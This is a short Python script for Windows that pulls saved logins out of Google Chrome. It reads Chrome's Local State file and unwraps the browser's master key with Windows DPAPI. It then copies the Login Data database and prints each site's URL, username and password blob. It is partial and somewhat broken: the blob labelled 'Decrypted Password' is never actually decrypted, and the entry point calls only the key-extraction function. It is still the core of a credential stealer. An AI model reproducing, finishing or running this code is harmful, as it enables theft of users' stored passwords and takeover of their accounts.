import os
import shutil
import sqlite3
import base64
import json
import win32crypt


def decrypter(key):
    keyloc = os.path.join( os.environ['USERPROFILE'], "AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    try:
        with open(keyloc, "r", encoding = "utf-8") as file:
        
            local_state_data = json.loads(file.read())
        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = encryption_key[5:]
      
     
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    except FileNotFoundError:
        print("FileNotFoundError successfully handled")
    

def main():
    try:
        username = os.environ['USERPROFILE']

        filename = os.path.join( username, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        print(filename)
        db_name = "TempChromePass.db"

        
        try:
            shutil.copyfile(filename, db_name)
            print("Successfully copied")
        
            db = sqlite3.connect(db_name)

            cursor = db.cursor()

            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")

            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = row[3]
                date_of_creation = row[4]
                last_usuage = row[5]
                  
                if user_name or decrypted_password:
                    print(f"Main URL: {main_url}")
                    print(f"Login URL: {login_page_url}")
                    print(f"User name: {user_name}")
                    print(f"Decrypted Password: {decrypted_password}")
                    print("=============================================")
                  
            
            cursor.close()
            db.close()

            try:
                os.remove(db_name)
            except OSError as e: 
                print("Failed with:", e.strerror)
                print("Error code:", e.code) 
                
                   

        except shutil.SameFileError:
            print("File source and destination are the same")
                  
        except PermissionError:
            print("Permission error")

        except:
            print("Error has occured with copying")

    except KeyError:
        print("User variable does not exist")


if __name__=="__main__":
    print(decrypter("lol"))
    
    


